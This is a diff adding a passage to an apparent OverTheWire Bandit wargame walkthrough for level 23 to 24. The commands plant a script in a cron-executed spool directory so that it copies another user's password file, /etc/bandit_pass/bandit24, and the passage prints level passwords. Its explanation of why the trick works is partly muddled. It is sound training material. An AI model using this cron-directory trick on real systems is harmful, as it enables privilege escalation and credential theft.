@@ -327,3 +327,23 @@ cat /tmp/8ca319486bfbbc3663ea0fbe8132634
 </pre>
 <br><br>
 With this command we get the password for bandit level 23: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
+
+<br></br>
+<h1> Level 23 ---> 24  </h1>
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+<br></br>
+We're going to solve this level by first analyzing the script for the cron job for this level. Upon inspection we see that the script is deleting files in /var/spool/$myname/foo. Because the script is written poorly we can create a script that reads the password for the next level. This is possible because the script sets the variable myname=whoami and specifies the path as /var/spool/$myname/foo which means we can run our script in /var/spool/bandit24/foo and thus making our $myname =bandit24 thus making our orignal whoami =bandit24 which means we can now execute commands as user bandit24 instead of bandit23.
+<pre>
+cat /usr/bin/cronjob_bandit24.sh
+mkdir /tmp/jurami && cd /tmp/jurami
+nano script.sh ---> #! /bin/bash  (new line) cat /etc/bandit_pass/bandit24 > /var/spool/bandit24/foo/password.txt
+chmod 777 script.sh
+cp script.sh /var/spool/bandit24/foo/script.sh && sh /var/spool/bandit24/foo/script.sh
+cat /var/spool/bandit24/foo/password.txt (make sure to wait a couple seconds if the cat comes up empty, password will eventually show up)
+</pre>
+<br><br>
+With this command we get the password for bandit level 24: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
